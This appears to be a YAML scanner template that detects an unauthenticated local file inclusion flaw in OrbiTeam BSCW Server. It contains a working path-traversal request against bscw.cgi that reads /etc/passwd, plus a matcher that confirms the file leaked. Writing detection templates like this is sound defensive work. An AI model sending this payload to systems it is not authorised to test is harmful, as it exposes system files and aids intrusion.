id: "orbiteam-bscw-server-lfi"
name: "OrbiTeam BSCW Server - Local File Inclusion"
severity: "high"
description: "OrbiTeam BSCW Server versions 5.0.x, 5.1.x, 5.2.4 and below, 7.3.x and below, and 7.4.3 and below are vulnerable to unauthenticated local file inclusion."
tech:
  - "generic"
tags:
  - "bscw"
  - "orbiteam"
  - "lfi"
  - "unauth"
  - "packetstorm"
  - "xss"
  - "vuln"
cwe: "CWE-22"
reference: "https://packetstormsecurity.com/files/165156/OrbiTeam-BSCW-Server-XSS-LFI-User-Enumeration.html"
spaExclusion: true
request:
  method: "GET"
  path: "/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
